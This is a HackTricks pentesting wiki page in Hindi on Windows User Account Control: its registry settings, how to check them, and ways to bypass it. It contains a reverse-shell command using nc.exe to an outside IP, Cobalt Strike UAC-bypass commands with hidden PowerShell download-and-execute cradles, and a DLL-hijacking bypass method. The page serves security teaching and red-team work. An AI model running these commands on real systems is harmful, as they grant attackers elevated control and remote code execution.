# UAC - User Account Control

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन **HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से **वर्कफ़्लो** बनाएं और **स्वत: कार्यक्षमता** को बढ़ावा दें दुनिया के **सबसे उन्नत** समुदाय उपकरणों द्वारा।\
आज ही पहुंचें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक सुविधा है जो **उच्च गतिविधियों के लिए सहमति प्रॉम्प्ट** सक्षम करती है। अनुप्रयोगों में विभिन्न `अखंडता` स्तर होते हैं, और एक **उच्च स्तर** का कार्यक्रम ऐसे कार्य कर सकता है जो **सिस्टम को संभावित रूप से क्षति पहुंचा सकते हैं**। जब UAC सक्षम होता है, अनुप्रयोग और कार्य हमेशा **एक गैर-प्रशासक खाते के सुरक्षा संदर्भ में चलते हैं** जब तक प्रशासक इन अनुप्रयोगों/कार्यों को स्थानाधिकारी स्तर की पहुंच देने के लिए स्पष्ट रूप से अधिकृत नहीं करता। यह एक सुविधा सुनिति है जो अनजाने में परिवर्तनों से प्रशासकों को सुरक्षित रखती है, लेकिन इसे सुरक्षा सीमा के रूप में नहीं माना जाता।

अधिक जानकारी के लिए अखंडता स्तरों के बारे में:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

जब UAC लागू होता है, एक प्रशासक उपयोगकर्ता को 2 टोकन मिलते हैं: एक मानक उपयोगकर्ता कुंजी, सामान्य स्तर के कार्य करने के लिए, और एक विशेषाधिकार वाला।

यह [पृष्ठ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC काम कैसे करता है के बारे में विस्तार से चर्चा करता है और लॉगऑन प्रक्रिया, उपयोगकर्ता अनुभव, और UAC वास्तुकला शामिल है। प्रशासक स्थानीय स्तर पर (secpol.msc का उपयोग करके) सुरक्षा नीतियों का उपयोग करके UAC को कैसे काम करने के लिए विशेष रूप से विन्यस्त कर सकते हैं, या समूह नीति वस्तुओं (GPO) के माध्यम से विन्यस्त और प्रसारित कर सकते हैं एक सक्रिय निर्देशिका डोमेन वातावरण में। विभिन्न सेटिंग्स की विस्तार से चर्चा [यहाँ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) की गई है। UAC के लिए सेट किए जा सकने वाले 10 समूह नीति सेटिंग्स उपलब्ध हैं। निम्नलिखित तालिका अतिरिक्त विवरण प्रदान करती है:

| समूह नीति सेटिंग                                                                                                                                                                                                                                                                                                                                                           | रजिस्ट्री कुंजी                | डिफ़ॉल्ट सेटिंग                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
### UAC बायपास सिद्धांत

कुछ कार्यक्रम **स्वचालित रूप से उच्च अधिकारी समूह** में **उपयोगकर्ता शामिल हैं** तो **ऑटोइलेवेटेड होते हैं**। इन बाइनरीज में उनके _**मैनिफेस्ट**_ में _**autoElevate**_ विकल्प होता है जिसका मान _**True**_ होता है। बाइनरी को **माइक्रोसॉफ्ट द्वारा हस्ताक्षरित** भी होना चाहिए।

इसके बाद, **UAC** को **बायपास** करने के लिए (मध्य अभिकरण स्तर से उच्च स्तर पर उच्चारित करने के लिए) कुछ हमलावर इस प्रकार की बाइनरीज का उपयोग करते हैं ताकि वे **विविध कोड** को **चला सकें** क्योंकि यह एक **उच्च स्तर के अभिकरण प्रक्रिया** से चलाई जाएगी।

आप उपकरण _**sigcheck.exe**_ का उपयोग करके एक बाइनरी का _**मैनिफेस्ट**_ जांच सकते हैं। और आप _Process Explorer_ या _Process Monitor_ (Sysinternals का) का उपयोग करके प्रक्रियाओं का **अभिकरण स्तर** देख सकते हैं।

### UAC की जाँच

UAC सक्षम है या नहीं, यह सुनिश्चित करने के लिए करें:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
यदि यह **`1`** है तो UAC **सक्रिय** है, यदि यह **`0`** है या यह **मौजूद नहीं** है, तो UAC **निष्क्रिय** है।

फिर, जांचें **कौन सा स्तर** कॉन्फ़िगर किया गया है:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* यदि **`0`** है तो, UAC प्रॉम्प्ट नहीं करेगा (जैसे **अक्षम**)
* यदि **`1`** है तो व्यवस्थापक को उच्च अधिकारों के साथ बाइनरी को क्रियान्वित करने के लिए उपयोगकर्ता नाम और पासवर्ड के लिए **पूछा जाएगा** (सुरक्षित डेस्कटॉप पर)
* यदि **`2`** (**हमेशा मुझे सूचित करें**) UAC हमेशा प्रशासक से पुष्टि के लिए पूछेगा जब वह उच्च अधिकारों के साथ कुछ क्रियान्वित करने की कोशिश करता है (सुरक्षित डेस्कटॉप पर)
* यदि **`3`** `1` की तरह है लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं है
* यदि **`4`** `2` की तरह है लेकिन सुरक्षित डेस्कटॉप पर आवश्यक नहीं है
* यदि **`5`** (**डिफ़ॉल्ट**) यह प्रशासक से पूछेगा कि क्या वह गैर Windows बाइनरी को उच्च अधिकारों के साथ चलाने की पुष्टि करें

फिर, आपको **`LocalAccountTokenFilterPolicy`** के मान की देखभाल करनी होगी\
यदि मान **`0`** है, तो केवल **RID 500** उपयोगकर्ता (**अंतर्निहित प्रशासक**) UAC के बिना **प्रशासक कार्य** कर सकता है, और यदि इसका `1` है, **"प्रशासक" समूह के सभी खाते** इसे कर सकते हैं।

और, अंत में **`FilterAdministratorToken`** कुंजी के मान की देखभाल करें\
यदि **`0`**(डिफ़ॉल्ट), तो **अंतर्निहित प्रशासक खाता** दूरस्थ प्रशासन कार्य कर सकता है और यदि **`1`** अंतर्निहित खाता प्रशासक **दूरस्थ प्रशासन कार्य** नहीं कर सकता है, जब तक `LocalAccountTokenFilterPolicy` को `1` पर सेट नहीं किया गया है।

#### सारांश

* यदि `EnableLUA=0` या **मौजूद नहीं है**, **किसी के लिए भी कोई UAC नहीं**
* यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=1` , किसी के लिए भी कोई UAC नहीं**
* यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=0`, RID 500 के लिए कोई UAC नहीं (अंतर्निहित प्रशासक)**
* यदि `EnableLua=1` और **`LocalAccountTokenFilterPolicy=0` और `FilterAdministratorToken=1`, सभी के लिए UAC**

इस सभी जानकारी को **metasploit** मॉड्यूल का उपयोग करके एकत्र किया जा सकता है: `post/windows/gather/win_privs`

आप अपने उपयोगकर्ता के समूहों की जाँच भी कर सकते हैं और अखंडता स्तर प्राप्त कर सकते हैं:
```
net user %username%
whoami /groups | findstr Level
```
## UAC बायपास

{% hint style="info" %}
ध्यान दें कि यदि आपके पास पीड़ित के लिए ग्राफिकल एक्सेस है, तो UAC बायपास सीधा है क्योंकि जब UAC प्रॉम्प्ट आता है तो आप बस "हाँ" पर क्लिक कर सकते हैं।
{% endhint %}

UAC बायपास निम्नलिखित स्थिति में आवश्यक है: **UAC सक्रिय है, आपकी प्रक्रिया माध्यम अखंडता संदर्भ में चल रही है, और आपका उपयोगकर्ता प्रशासक समूह में है**।

उल्लेखनीय है कि **यदि UAC सर्वोच्च सुरक्षा स्तर में है (हमेशा) तो इसे बायपास करना अन्य स्तरों (डिफ़ॉल्ट) में होने से कहीं ज्यादा कठिन है**।

### UAC निष्क्रिय

यदि UAC पहले से ही निष्क्रिय है (`ConsentPromptBehaviorAdmin` **`0`** है) तो आप **एडमिन विशेषाधिकारों के साथ रिवर्स शैल चला सकते हैं** (उच्च अखंडता स्तर) कुछ इस प्रकार का उपयोग करके:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC टोकन डुप्लिकेशन के साथ UAC बायपास

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **बहुत** बेसिक UAC "बायपास" (पूरी फ़ाइल सिस्टम एक्सेस)

यदि आपके पास एक उपयोगकर्ता के साथ एक शैल जो व्यवस्थापक समूह के अंदर है, तो आप **SMB के माध्यम से C$** साझा को माउंट कर सकते हैं (फ़ाइल सिस्टम) एक नई डिस्क में और आपको **फ़ाइल सिस्टम के अंदर सब कुछ एक्सेस** मिलेगा (यहाँ तक कि व्यवस्थापक होम फ़ोल्डर भी).

{% hint style="warning" %}
**लगता है कि यह ट्रिक अब काम नहीं कर रही है**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC कोबाल्ट स्ट्राइक के साथ बायपास

कोबाल्ट स्ट्राइक तकनीकें केवल तभी काम करेंगी अगर UAC अपने अधिकतम सुरक्षा स्तर पर सेट नहीं है।
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** के पास भी कई मॉड्यूल हैं जो **UAC** को **बाइपास** करने में मदद करते हैं।

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass) में दस्तावेज़ और उपकरण।

### UAC बाइपास उत्पाद

[**UACME**](https://github.com/hfiref0x/UACME) जो कई UAC बाइपास उत्पादों का संकलन है। ध्यान दें कि आपको **visual studio या msbuild का उपयोग करके UACME को कंपाइल करने की आवश्यकता है**। कंपाइलेशन से कई executables (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`) बनेंगे, आपको **जानने की आवश्यकता है कि आपको कौन सा चाहिए**।\
आपको **सावधान रहना चाहिए** क्योंकि कुछ बाइपास अन्य कुछ कार्यक्रमों को **प्रॉम्प्ट** करेंगे जो **उपयोगकर्ता** को अलर्ट करेंगे कि कुछ हो रहा है।

UACME में हर तकनीक के **काम करने शुरू होने वाले बिल्ड संस्करण** है। आप अपने संस्करण पर प्रभाव डालने वाली किसी तकनीक की खोज कर सकते हैं:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### अधिक UAC बाइपास

**सभी** तकनीकें जो यहाँ UAC को बाइपास करने के लिए उपयोग की गई हैं **एक पूर्ण इंटरैक्टिव शैल** के साथ पीड़ित के साथ (एक सामान्य nc.exe शैल काफी नहीं हैं) की आवश्यकता है।

आप एक **मीटरप्रीटर** सत्र प्राप्त कर सकते हैं। **Session** मान के समान **1** होने वाले **प्रक्रिया** में माइग्रेट करें:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ काम करेगा)

### GUI के साथ UAC बाइपास

यदि आपके पास **GUI तक पहुंच है तो जब आपको यह मिलता है, तो आप बस UAC प्रॉम्प्ट को स्वीकार कर सकते हैं**, आपको इसकी बाइपास की वास्ता नहीं है। इसलिए, GUI तक पहुंचने से आप UAC को बाइपास करने की अनुमति देगा।

इसके अतिरिक्त, यदि आपके पास एक GUI सत्र है जिसका कोई उपयोग कर रहा था (संभावित रूप से RDP के माध्यम से) तो **कुछ उपकरण व्यवस्थापक के रूप में चल रहे होंगे** जहाँ से आप **उच्चतम प्रशासक** के रूप में **कोई भी cmd चला सकते हैं** बिना फिर से UAC द्वारा पुनः पूछा जाने के लिए जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **छिपकली** हो सकता है।

### शोरगुल UAC बाइपास

यदि आप शोरगुल के बारे में चिंता नहीं करते हैं तो आप हमेशा कुछ इस प्रकार का कुछ चला सकते हैं [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जो **उच्चतम स्वीकृति के लिए पूछता है जब तक उपयोगकर्ता इसे स्वीकार नहीं करता**।

### अपना बाइपास - मौलिक UAC बाइपास मेथडोलॉजी

यदि आप **UACME** की ओर देखते हैं तो आप देखेंगे कि **अधिकांश UAC बाइपास एक Dll हाइजैकिंग सुरक्षा दोष** का दुरुपयोग करते हैं (मुख्य रूप से दुर्भाग्यपूर्ण dll को _C:\Windows\System32_ पर लिखना)। [एक Dll हाइजैकिंग सुरक्षा दोष कैसे खोजें इसे सीखने के लिए यह पढ़ें](../windows-local-privilege-escalation/dll-hijacking.md)।

1. एक बाइनरी ढूंढें जो **स्वत: उच्चतम** करेगा (जांचें कि जब यह निष्पादित होता है तो यह उच्च सत्यापन स्तर में चलता है)।
2. Procmon के साथ "**NAME NOT FOUND**" घटनाएँ खोजें जो **DLL हाइजैकिंग** के लिए संवेदनशील हो सकती हैं।
3. आपको संभावित है कि आपको कुछ **संरक्षित पथों** (जैसे C:\Windows\System32) में डीएलएल लिखने की अनुमति नहीं होगी। आप इसका उपयोग करके इसे बाइपास कर सकते हैं:
1. **wusa.exe**: Windows 7,8 और 8.1। यह संरक्षित पथों में एक CAB फ़ाइल की सामग्री निकालने की अनुमति देता है (क्योंकि यह उच्च सत्यापन स्तर से निष्पादित होता है)।
2. **IFileOperation**: Windows 10।
4. संरक्षित पथ में अपनी DLL की प्रतिलिपि बनाने और संरक्षित पथ में अपनी DLL को कॉपी करने और विकल्पित और स्वत: उच्चतम स्तर के बाइनरी को निष्पादित करने के लिए एक **स्क्रिप्ट** तैयार करें।

### एक और UAC बाइपास तकनीक

इसमें शामिल है कि एक **स्वत: उच्चतम स्तर** का बाइनरी यदि **रजिस्ट्री** से **एक बाइनरी** या **कमांड** का **नाम/पथ** पढ़ने की कोशिश करता है जो **निष्पादित** करने के लिए (यह अधिक रूचिकर है यदि बाइनरी इस जानकारी को **HKCU** के अंदर खोजता है)।
